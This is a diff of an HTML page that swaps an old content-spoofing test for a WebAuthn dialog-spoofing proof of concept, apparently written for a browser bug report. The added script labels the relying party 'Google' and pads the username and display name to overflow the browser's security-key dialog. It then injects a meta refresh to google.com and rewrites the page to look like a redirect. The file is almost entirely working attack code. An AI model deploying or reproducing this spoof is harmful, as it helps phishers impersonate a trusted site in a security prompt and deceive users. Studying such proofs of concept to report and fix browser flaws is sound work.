@@ -1,24 +1,42 @@
+<!DOCTYPE html>
 <html>
 <head>
-<style>body {background-color: green;}</style>
+  <title>WebAuthn Setup</title>
 </head>
 <body>
-    <p>Social news stuff here's a neat site.</p><a href="#" onclick="alert('foo')">HI</a>
-    
 
-    <br/>
-    
-    <div style="float:left">
-    <form>
-    <input type="text"/> Name<br/>
-    <input type="text"/> Email<br/>
-    <br/>
-    Comment<br/>
-    <textarea rows="6" cols="50">Default comment or something</textarea>
-    </form>
-    </div>
-    <iframe id="foo" width="200" height="200" src="cr_scroll_content_spoofing2.html" ></iframe>
-    <a href="#">Fooo!</a>
+<h2>Setup Security Key</h2>
+<button onclick="spoof()">Setup WebAuthn</button>
+
+<script>
+function spoof() {
+  // Trigger WebAuthn with long username/displayName to overflow dialog
+  navigator.credentials.create({
+    publicKey: {
+      rp: { name: "Google" },
+      user: {
+        id: new Uint8Array(16),
+        name: "john".repeat(500) + "@google.com",
+        displayName: "John Smith ".repeat(200)
+      },
+      pubKeyCredParams: [{ type: "public-key", alg: -7 }],
+      attestation: "direct",
+      timeout: 60000,
+      challenge: new Uint8Array(32).buffer
+    }
+  }).catch(() => {});
+
+  // Inject meta refresh after dialog appears
+  setTimeout(() => {
+    var meta = document.createElement('meta');
+    meta.httpEquiv = "refresh";
+    meta.content = "2;url=https://www.google.com";
+    document.head.appendChild(meta);
+
+    document.body.innerHTML = '<h1 style="color:green">Redirecting to Google...</h1>';
+  }, 1000);
+}
+</script>
 
 </body>
 </html>
